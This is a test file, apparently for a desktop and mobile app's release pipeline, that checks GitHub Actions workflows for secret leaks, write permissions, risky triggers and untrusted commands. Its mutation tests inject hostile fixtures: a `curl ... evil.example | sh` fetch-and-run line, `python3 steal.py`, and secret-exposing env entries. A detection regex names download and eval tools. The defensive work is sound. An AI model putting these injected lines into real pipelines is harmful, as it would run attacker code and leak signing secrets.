/**
 * Guards for the release pipeline's trust boundaries. The rules are read from the workflow files themselves,
 * so a later edit cannot quietly put a signing secret into a job that runs build code, add a write permission
 * to the wrong job, drop a pinned SHA, or switch on pull_request_target.
 *
 * This is a plain-text check that relies on the files' own layout (two-space job keys under `jobs:`). It is a
 * tripwire for the common forms of the mistakes that matter here, not a proof and not a YAML validator:
 * the CI workflow runs actionlint for syntax. It reads EVERY file in .github/workflows, so a new workflow is
 * scanned without anyone remembering to add it here.
 */
import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

const repo = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "..");
const workflowsDir = path.join(repo, ".github", "workflows");
const workflow = (name: string): string => readFileSync(path.join(workflowsDir, name), "utf8");
const workflowFiles = (): string[] => readdirSync(workflowsDir).filter((f) => /\.ya?ml$/i.test(f)).sort();

/** The only triggers a workflow here may use. Anything that runs on someone else's content is left out. */
const ALLOWED_TRIGGERS = ["push", "pull_request", "workflow_dispatch"];
/** What a signing job may use: it only moves finished files and signs them. */
const SIGN_ALLOWED_ACTIONS = /^actions\/(download-artifact|upload-artifact|setup-java)@/;
/** First words a signing job's shell lines may start with (the commands, not the shell's own keywords). */
const SIGN_ALLOWED_COMMANDS = new Set([
  "set", "echo", "mkdir", "cp", "mv", "rm", "ln", "ls", "cat", "tar", "find", "grep", "sort", "tail", "wc", "tr",
  "printf", "read", "local", "export", "test", "exit", "basename", "mktemp", "openssl", "base64", "security",
  "ditto", "xcrun", "hdiutil", "codesign", "spctl", "keytool", "jarsigner", "fail", "only_file",
  "New-Item", "Copy-Item", "Set-Content", "Write-Host", "Join-Path", "Remove-Item", "Get-ChildItem",
  "Get-AuthenticodeSignature", "Where-Object", "Sort-Object", "Select-Object", "ForEach-Object", "foreach", "throw",
]);
const SHELL_WORDS = new Set(["fi", "else", "then", "done", "do", "esac", "for", "while", "if", "elif", "until", "{", "}", "(", ")", ";;", "[", "[["]);
/** Quoted tool paths (bash) a signing job may run. */
const SIGN_ALLOWED_QUOTED = new Set(['"$bt/apksigner"', '"$bt/aapt2"']);

/** The jobs that may hold a secret: they receive finished files and run no repository code. */
const SECRET_JOBS = ["sign-windows", "sign-macos", "sign-android", "release"];
/** The jobs that may use the 'release' environment (and so read its secrets). */
const ENVIRONMENT_JOBS = SECRET_JOBS;
/** The jobs that sign. They must never run build tooling or check out the repository. */
const SIGN_JOBS = ["sign-windows", "sign-macos", "sign-android"];

type Job = { name: string; lines: string[] };

/** Lines with comments and blank lines removed, so a comment that mentions a rule never trips it. */
function code(lines: string[]): string[] {
  return lines.filter((l) => l.trim() !== "" && !l.trim().startsWith("#"));
}

function split(text: string): { header: string[]; jobs: Job[] } {
  const lines = text.split(/\r?\n/);
  const at = lines.findIndex((l) => l === "jobs:");
  if (at < 0) return { header: lines, jobs: [] };
  const jobs: Job[] = [];
  let current: Job | null = null;
  for (const line of lines.slice(at + 1)) {
    const m = /^ {2}([A-Za-z0-9_-]+):\s*$/.exec(line);
    if (m) {
      current = { name: m[1]!, lines: [] };
      jobs.push(current);
    } else if (current) {
      current.lines.push(line);
    }
  }
  return { header: lines.slice(0, at), jobs };
}

const indentOf = (l: string): number => l.length - l.trimStart().length;

/** The text inside every `${{ }}` and every bare `if:` value: the places a secret can be named. */
function expressions(lines: string[]): string[] {
  const text = code(lines).join("\n");
  const found = [...text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1]!);
  for (const m of text.matchAll(/^\s*(?:-\s*)?if:\s*(?!\$\{\{)(.+)$/gm)) found.push(m[1]!);
  return found;
}

/** True when an expression names the secrets context in any form (secrets.X, secrets['X'], toJSON(secrets)). */
function namesSecrets(lines: string[]): boolean {
  return expressions(lines).some((e) => /\bsecrets\b/.test(e.replace(/\bsecrets\.GITHUB_TOKEN\b/g, "")));
}

/** The shell text of every `run:` step, with its raw lines (a `${{` in a comment still expands). */
function runBodies(lines: string[]): string[][] {
  const bodies: string[][] = [];
  for (let i = 0; i < lines.length; i++) {
    const m = /^(\s*)(-\s+)?run:\s*(.*)$/.exec(lines[i]!);
    if (!m) continue;
    const keyIndent = m[1]!.length + (m[2] ? m[2].length : 0);
    if (/^[|>][+-]?\s*$/.test(m[3]!)) {
      const body: string[] = [];
      for (let j = i + 1; j < lines.length; j++) {
        const l = lines[j]!;
        if (l.trim() !== "" && indentOf(l) <= keyIndent) break;
        body.push(l);
      }
      bodies.push(body);
    } else {
      bodies.push([m[3]!]);
    }
  }
  return bodies;
}

/** The list items under `steps:` (two spaces deeper than the job's keys, so six spaces in these files). */
function stepsOf(lines: string[]): string[][] {
  const steps: string[][] = [];
  for (const l of code(lines)) {
    if (/^ {6}- /.test(l)) steps.push([l]);
    else if (steps.length) steps[steps.length - 1]!.push(l);
  }
  return steps;
}

/** The first word of every statement in a signing job's shell text, minus the shell's own keywords. */
function commandProblems(body: string[]): string[] {
  const out: string[] = [];
  let previous = "";
  for (const raw of body) {
    const line = raw.trim();
    const continued = /(\\|`|\|)$/.test(previous);
    if (line !== "") previous = line;
    if (line === "" || line.startsWith("#") || continued) continue;
    let rest = line;
    for (;;) {
      const m = /^(?:!|if|elif|while|until|then|else|do)\s+(.*)$/.exec(rest);
      if (!m) break;
      rest = m[1]!;
    }
    const word = rest.split(/\s+/)[0]!;
    if (SHELL_WORDS.has(word) || SIGN_ALLOWED_COMMANDS.has(word)) continue;
    if (/^[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=/.test(word)) continue; // bash assignment
    if (/^[A-Za-z_][A-Za-z0-9_]*\(\)$/.test(word)) continue; // function definition
    if (/^\$[A-Za-z_][A-Za-z0-9_:]*$/.test(word) && /^\$[A-Za-z_][A-Za-z0-9_:]*\s*=/.test(rest)) continue; // pwsh assignment
    if (word.startsWith("(") || word.startsWith("[IO.File]::")) continue;
    if (word === "&" && /^&\s+\$signtool\.FullName\b/.test(rest)) continue;
    if (SIGN_ALLOWED_QUOTED.has(word)) continue;
    if (/^["'].*["']\s*\|\s*Out-File\b/.test(rest)) continue;
    out.push(line);
  }
  return out;
}

/** Every rule violated by one workflow file, as readable sentences. Empty means the file is fine. */
function problems(file: string, text: string): string[] {
  const out: string[] = [];
  const { header, jobs } = split(text);
  const headerCode = code(header);
  const isRelease = file === "release.yml";
  const allCode = [...headerCode, ...jobs.flatMap((j) => code(j.lines))];

  if (allCode.some((l) => /pull_request_target/.test(l))) out.push(`${file}: uses pull_request_target`);

  for (const l of allCode) {
    const m = /^\s*(?:-\s*)?uses:\s*(\S+)/.exec(l);
    if (m && !m[1]!.startsWith("./") && !/@[0-9a-f]{40}$/.test(m[1]!)) out.push(`${file}: action not pinned to a full commit SHA: ${m[1]}`);
  }

  // Workflow-level permissions: read-only, and stated.
  const topPerm = /^permissions:\s*\n((?:[ ]{2}.*\n?)*)/m.exec(header.join("\n") + "\n");
  if (!topPerm) out.push(`${file}: no top-level permissions block`);
  else if (/write/.test(topPerm[1]!)) out.push(`${file}: top-level permissions include write`);
  else if (!/contents:\s*read/.test(topPerm[1]!)) out.push(`${file}: top-level permissions are not contents: read`);

  if (namesSecrets(header)) out.push(`${file}: a secret is referenced at workflow level`);

  // Triggers: only the ones that cannot run on someone else's content. Covers `on: push`, `on: [a, b]` and the block form.
  const onAt = header.findIndex((l) => /^["']?on["']?:/.test(l));
  if (onAt < 0) out.push(`${file}: no on: block`);
  else {
    const found: string[] = [];
    const inline = /^["']?on["']?:\s*(.+?)\s*$/.exec(header[onAt]!);
    if (inline && !inline[1]!.startsWith("#")) found.push(...inline[1]!.replace(/[[\]{}"']/g, "").split(/[,\s]+/).filter(Boolean));
    for (const l of code(header.slice(onAt + 1))) {
      if (indentOf(l) === 0) break;
      const m = /^ {2}["']?([A-Za-z_]+)["']?:/.exec(l);
      if (m) found.push(m[1]!);
    }
    for (const t of found) if (!ALLOWED_TRIGGERS.includes(t)) out.push(`${file}: trigger ${t} is not allowed (allowed: ${ALLOWED_TRIGGERS.join(", ")})`);
  }

  // Every checkout drops the token from the checked-out repository, so later steps cannot push with it.
  for (const job of jobs) {
    for (const step of stepsOf(job.lines)) {
      if (/uses:\s*actions\/checkout@/.test(step.join("\n")) && !/persist-credentials:\s*false\b/.test(step.join("\n"))) out.push(`${file}: job ${job.name} checks out without persist-credentials: false`);
    }
  }

  // Nothing is interpolated into a script: a `${{ }}` inside `run:` runs whatever the value holds. Pass it through env.
  for (const job of jobs) {
    for (const body of runBodies(job.lines)) {
      if (body.some((l) => l.includes("${{"))) out.push(`${file}: job ${job.name} has \${{ }} inside a run: script (pass it through env: instead)`);
    }
  }

  for (const job of jobs) {
    const body = code(job.lines);
    const joined = body.join("\n");
    const mayHoldSecrets = isRelease && SECRET_JOBS.includes(job.name);

    if (!mayHoldSecrets && namesSecrets(job.lines)) out.push(`${file}: job ${job.name} references a secret`);
    if (!mayHoldSecrets && /^\s*secrets:/m.test(joined)) out.push(`${file}: job ${job.name} passes secrets on`);
    if (/secrets:\s*inherit/.test(joined)) out.push(`${file}: job ${job.name} inherits all secrets`);
    if (/^ {4}environment:/m.test(joined) && !(isRelease && ENVIRONMENT_JOBS.includes(job.name))) out.push(`${file}: job ${job.name} uses an environment`);
    if (!/^ {4}permissions:/m.test(joined)) out.push(`${file}: job ${job.name} does not state its permissions`);

    // Write permissions in block or flow form, and write-all.
    const writes = [...joined.matchAll(/([A-Za-z-]+):\s*write\b(?!-)/g)].map((m) => `${m[1]}: write`);
    if (/\bwrite-all\b/.test(joined)) writes.push("write-all");
    const allowedWrites = !isRelease ? [] : job.name === "release" ? ["contents: write"] : job.name === "attest" ? ["id-token: write", "attestations: write"] : [];
    for (const w of writes) if (!allowedWrites.includes(w)) out.push(`${file}: job ${job.name} has write permission ${w}`);

    if (isRelease && SIGN_JOBS.includes(job.name)) {
      // Signing jobs run a short list of tools on finished files, and nothing else.
      for (const step of stepsOf(job.lines)) {
        const u = /^\s*-?\s*uses:\s*(\S+)/m.exec(step.join("\n"));
        if (u && !SIGN_ALLOWED_ACTIONS.test(u[1]!)) out.push(`${file}: signing job ${job.name} uses an action outside the allow-list: ${u[1]}`);
      }
      for (const run of runBodies(job.lines)) {
        for (const l of commandProblems(run)) out.push(`${file}: signing job ${job.name} runs a command outside the allow-list: ${l}`);
        if (/\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|Invoke-Expression|iex|eval)\b|\|\s*(sh|bash|zsh|pwsh|powershell)\b|\b(bash|sh|python3?|perl|ruby)\s+-[ce]\b/.test(run.filter((l) => !l.trim().startsWith("#")).join("\n"))) {
          out.push(`${file}: signing job ${job.name} downloads or evaluates code`);
        }
      }
      if (/actions\/checkout/.test(joined)) out.push(`${file}: signing job ${job.name} checks out the repository`);
      if (/\b(npm|npx|cargo|rustup|tauri|node|gradle|gradlew)\b/.test(joined)) out.push(`${file}: signing job ${job.name} runs build tooling`);
      if (!/^ {4}environment:\s*release\s*$/m.test(joined)) out.push(`${file}: signing job ${job.name} is not behind the release environment`);
      if (!/^ {4}permissions:\s*\{\}\s*$/m.test(joined)) out.push(`${file}: signing job ${job.name} should have permissions: {}`);
      if (!/needs\.verify\.outputs\.official == 'true'/.test(joined)) out.push(`${file}: signing job ${job.name} does not require an official run`);
      // The build artifact is untrusted. Names or contents taken from it must never reach the environment
      // that later steps (and their secrets) run under. A file name can hold newlines and so add variables.
      const firstSecret = joined.search(/\$\{\{[^}]*\bsecrets\b/);
      const beforeSecrets = firstSecret < 0 ? joined : joined.slice(0, firstSecret);
      if (!/Check the files from the build/.test(beforeSecrets)) out.push(`${file}: signing job ${job.name} does not check the build artifact before it reads a secret`);
    }
    if (isRelease && mayHoldSecrets && /GITHUB_(ENV|PATH)/.test(joined)) out.push(`${file}: job ${job.name} writes to GITHUB_ENV or GITHUB_PATH`);
    if (isRelease && job.name === "release") {
      if (!/needs\.verify\.outputs\.official == 'true'/.test(joined)) out.push(`${file}: release job does not require an official run`);
      if (/actions\/checkout|npm|cargo/.test(joined)) out.push(`${file}: release job runs repository or build code`);
    }
  }

  // Installing and building: no install scripts, locked dependencies.
  for (const l of allCode) {
    if (/\bnpm ci\b/.test(l) && !/--ignore-scripts/.test(l)) out.push(`${file}: npm ci without --ignore-scripts: ${l.trim()}`);
    if (/\bnpm install\b/.test(l)) out.push(`${file}: npm install instead of npm ci: ${l.trim()}`);
  }
  return out;
}

describe("workflow trust boundaries (the real files)", () => {
  it("scans every file in .github/workflows, not a fixed list", () => {
    const files = workflowFiles();
    expect(files).toEqual(expect.arrayContaining(["release.yml", "ci.yml", "desktop-smoke.yml"]));
    for (const file of files) expect(problems(file, workflow(file)), file).toEqual([]);
  });

  it("runs actionlint in CI, pinned to a version, so a syntax error is caught", () => {
    const ci = workflow("ci.yml");
    expect(ci).toMatch(/actionlint@v\d+\.\d+\.\d+/);
    expect(ci).not.toMatch(/actionlint@latest/);
  });

  it("release.yml only runs for a tag push or by hand, and checks the tag is on main", () => {
    const text = workflow("release.yml");
    const on = /^on:\n((?:[ ]{2}.*\n|\n)*)/m.exec(text)![1]!;
    expect(on).not.toMatch(/pull_request|schedule|workflow_run|issue|\bpush:\s*\n\s+branches/);
    expect(on).toMatch(/tags:\s*\["v\*"\]/);
    expect(on).toMatch(/workflow_dispatch:/);
    const verify = split(text).jobs.find((j) => j.name === "verify")!;
    const body = code(verify.lines).join("\n");
    expect(body).toMatch(/fetch-depth:\s*0/);
    expect(body).toMatch(/git merge-base --is-ancestor HEAD "origin\/\$\{RELEASE_BRANCH\}"/);
    expect(body).toMatch(/\[ "\$EVENT_NAME" = "push" \] && \[ "\$REF_TYPE" = "tag" \]/);
  });

  it("only the build, sign and release jobs exist in the order the design needs", () => {
    const names = split(workflow("release.yml")).jobs.map((j) => j.name);
    expect(names).toEqual(["verify", "desktop", "android", "ios", "sign-windows", "sign-macos", "sign-android", "attest", "release"]);
  });

  it("never builds the test hooks (the dev-hooks feature keeps the WebView2 debugging variables)", () => {
    for (const file of ["release.yml", "desktop-smoke.yml", "ci.yml"]) expect(workflow(file)).not.toMatch(/dev-hooks/);
  });

  it("builds with locked dependencies", () => {
    expect(workflow("release.yml")).toMatch(/args\+=\(-- --locked\)/);
    expect(workflow("desktop-smoke.yml")).toMatch(/build --debug --no-bundle -- --locked/);
  });

  it("makes a missing Android file visible in the release notes", () => {
    const text = workflow("release.yml");
    expect(text).toMatch(/list_files "Android APK" "\*android\*\.apk" no/);
    expect(text).toMatch(/NOT ATTACHED/);
    expect(text).toMatch(/::warning::/);
  });
});

describe("the checker itself catches the mistakes it is for", () => {
  const good = workflow("release.yml");

  it("catches a secret added to a build job", () => {
    const bad = good.replace("  desktop:\n", "  desktop:\n    env:\n      LEAK: ${{ secrets.APPLE_CERTIFICATE }}\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/job desktop references a secret/);
  });

  it("catches an environment on a build job", () => {
    const bad = good.replace("  android:\n", "  android:\n    environment: release\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/job android uses an environment/);
  });

  it("catches contents: write on the wrong job and at workflow level", () => {
    const bad = good.replace("  attest:\n", "  attest:\n    permissions:\n      contents: write\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/job attest has write permission contents: write/);
    const bad2 = good.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n");
    expect(problems("release.yml", bad2).join("\n")).toMatch(/top-level permissions include write/);
  });

  it("catches an unpinned action, pull_request_target and a signing job that builds", () => {
    expect(problems("ci.yml", workflow("ci.yml").replace(/actions\/setup-node@[0-9a-f]{40}/, "actions/setup-node@v4")).join("\n")).toMatch(/not pinned/);
    expect(problems("ci.yml", workflow("ci.yml").replace("  pull_request:", "  pull_request_target:")).join("\n")).toMatch(/pull_request_target/);
    const bad = good.replace("      - name: Sign the installers\n", "      - run: npm ci --ignore-scripts\n      - name: Sign the installers\n");
    expect(problems("release.yml", bad).join("\n")).toMatch(/signing job sign-windows runs build tooling/);
  });

  it("catches npm ci without --ignore-scripts and a secret in another workflow", () => {
    expect(problems("ci.yml", workflow("ci.yml").replace("- run: npm ci --ignore-scripts", "- run: npm ci")).join("\n")).toMatch(/npm ci without --ignore-scripts/);
    expect(problems("desktop-smoke.yml", workflow("desktop-smoke.yml").replace("    steps:\n", "    env:\n      X: ${{ secrets.FOO }}\n    steps:\n")).join("\n")).toMatch(/references a secret/);
  });

  it("catches a signing job that puts a value from the build artifact into GITHUB_ENV", () => {
    const bad = good.replace('codesign --verify --deep --strict --verbose=2 "$APP_PATH"\n', 'codesign --verify --deep --strict --verbose=2 "$APP_PATH"\n          echo "APP_PATH=$app" >> "$GITHUB_ENV"\n');
    expect(bad).not.toBe(good);
    expect(problems("release.yml", bad).join("\n")).toMatch(/job sign-macos writes to GITHUB_ENV or GITHUB_PATH/);
    const bad2 = good.replace('mv "$DMG_PATH" "out/$DMG_NAME"', 'echo "DMG_PATH=$x" >> "$GITHUB_PATH"');
    expect(problems("release.yml", bad2).join("\n")).toMatch(/job sign-macos writes to GITHUB_ENV or GITHUB_PATH/);
  });

  it("catches a signing job whose artifact check was removed", () => {
    const bad = good.replace("Check the files from the build and unpack the app (no secrets in this step)", "Unpack the app");
    expect(problems("release.yml", bad).join("\n")).toMatch(/signing job sign-macos does not check the build artifact/);
  });

  it("uses fixed names for the macOS app and disk image, and only a checked .dmg name travels on", () => {
    const mac = code(split(good).jobs.find((j) => j.name === "sign-macos")!.lines).join("\n");
    expect(mac).toMatch(/APP_PATH: work\/Snappy\.app/);
    expect(mac).toMatch(/DMG_PATH: out\/Snappy\.dmg/);
    expect(mac).toMatch(/safe='\^\[A-Za-z0-9\._-\]\+\$'/);
    expect(mac).toMatch(/tar -tf/);
    expect(mac).not.toMatch(/find work .*-name '\*\.app'/);
  });

  const ci = workflow("ci.yml");
  const swap = (text: string, from: string, to: string): string => {
    expect(text, `the text to mutate (${from}) must exist`).toContain(from);
    return text.replace(from, to);
  };
  const found = (file: string, text: string): string => problems(file, text).join("\n");

  it("catches a secret named in a form other than secrets.NAME", () => {
    const bracket = swap(good, "  desktop:\n", "  desktop:\n    env:\n      LEAK: ${{ secrets['APPLE_CERTIFICATE'] }}\n");
    expect(found("release.yml", bracket)).toMatch(/job desktop references a secret/);
    const all = swap(ci, "  test:\n", "  test:\n    env:\n      ALL: ${{ toJSON(secrets) }}\n");
    expect(found("ci.yml", all)).toMatch(/job test references a secret/);
    const guarded = swap(ci, "  test:\n", "  test:\n    if: secrets.X != ''\n");
    expect(found("ci.yml", guarded)).toMatch(/job test references a secret/);
    const atTop = swap(ci, "permissions:\n  contents: read\n", "permissions:\n  contents: read\nenv:\n  A: ${{ secrets.A }}\n");
    expect(found("ci.yml", atTop)).toMatch(/workflow level/);
  });

  it("allows the GitHub token, and the word 'secrets' in a step name", () => {
    const ok = swap(ci, "  test:\n", "  test:\n    env:\n      T: ${{ secrets.GITHUB_TOKEN }}\n");
    expect(found("ci.yml", ok)).toBe("");
    expect(good).toMatch(/this job has no secrets/);
  });

  it("catches write-all and flow-style write permissions", () => {
    const wa = swap(ci, "    permissions:\n      contents: read\n    strategy:", "    permissions: write-all\n    strategy:");
    expect(found("ci.yml", wa)).toMatch(/job test has write permission write-all/);
    const flow = swap(ci, "    permissions:\n      contents: read\n    strategy:", "    permissions: { contents: write }\n    strategy:");
    expect(found("ci.yml", flow)).toMatch(/job test has write permission contents: write/);
    const top = swap(ci, "permissions:\n  contents: read\n", "permissions: write-all\n");
    expect(found("ci.yml", top)).toMatch(/top-level permissions|no top-level/);
  });

  it("catches triggers that run on someone else's content, in any workflow", () => {
    for (const trigger of ["workflow_run", "issue_comment", "issues", "pull_request_review", "schedule", "pull_request_target"]) {
      const bad = swap(ci, "  pull_request:\n", `  pull_request:\n  ${trigger}:\n`);
      expect(found("ci.yml", bad), trigger).toMatch(new RegExp(`${trigger}`));
    }
    expect(found("ci.yml", swap(ci, "on:\n  push:\n    branches: [main]\n  pull_request:\n", "on: [push, workflow_run]\n"))).toMatch(/trigger workflow_run is not allowed/);
    expect(found("ci.yml", swap(ci, "on:\n  push:\n    branches: [main]\n  pull_request:\n", "on: issue_comment\n"))).toMatch(/trigger issue_comment is not allowed/);
  });

  it("scans a workflow file nobody listed anywhere", () => {
    const extra = "name: Extra\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: echo hi\n";
    expect(found("extra.yml", extra)).toMatch(/pull_request_target/);
  });

  it("catches a checkout that keeps the token", () => {
    const keep = swap(ci, "          persist-credentials: false\n", "          persist-credentials: true\n");
    expect(found("ci.yml", keep)).toMatch(/job test checks out without persist-credentials: false/);
    const missing = swap(ci, "        with:\n          persist-credentials: false\n      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 24\n          cache: npm\n", "      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 24\n          cache: npm\n");
    expect(found("ci.yml", missing)).toMatch(/checks out without persist-credentials/);
  });

  it("catches an expression inside a run script, even in a comment, and allows it in env", () => {
    const inject = swap(ci, "        run: npm test\n", "        run: echo \"${{ github.event.pull_request.title }}\"\n");
    expect(found("ci.yml", inject)).toMatch(/job test has \$\{\{ \}\} inside a run: script/);
    const block = swap(ci, "        run: npm test\n", "        run: |\n          # ${{ github.head_ref }}\n          npm test\n");
    expect(found("ci.yml", block)).toMatch(/inside a run: script/);
    const viaEnv = swap(ci, "        run: npm test\n", "        env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"$TITLE\"\n");
    expect(found("ci.yml", viaEnv)).toBe("");
  });

  it("catches a signing job that runs a command outside the allow-list", () => {
    const script = swap(good, "      - name: Sign the installers\n", "      - run: ./evil.sh\n      - name: Sign the installers\n");
    expect(found("release.yml", script)).toMatch(/signing job sign-windows runs a command outside the allow-list: \.\/evil\.sh/);
    const piped = swap(good, "          $ErrorActionPreference = 'Stop'\n          New-Item", "          $ErrorActionPreference = 'Stop'\n          curl -s http://evil.example | sh\n          New-Item");
    const r = found("release.yml", piped);
    expect(r).toMatch(/runs a command outside the allow-list: curl/);
    expect(r).toMatch(/downloads or evaluates code/);
    const mac = swap(good, "          mkdir -p out\n          staging=$(mktemp -d)\n", "          mkdir -p out\n          python3 steal.py\n          staging=$(mktemp -d)\n");
    expect(found("release.yml", mac)).toMatch(/signing job sign-macos runs a command outside the allow-list: python3 steal\.py/);
  });

  it("catches a signing job that uses an action outside the allow-list", () => {
    const at = good.indexOf("\n  sign-android:\n");
    const bad = good.slice(0, at) + swap(good.slice(at), "      - uses: actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.1.0\n", "      - uses: some-org/some-action@0123456789abcdef0123456789abcdef01234567\n");
    expect(found("release.yml", bad)).toMatch(/signing job sign-android uses an action outside the allow-list: some-org\/some-action/);
  });

  it("ignores a comment that only talks about the rules", () => {
    const withComment = good.replace("jobs:\n", "jobs:\n  # secrets.FOO and pull_request_target are only words here\n");
    expect(problems("release.yml", withComment)).toEqual([]);
  });
});
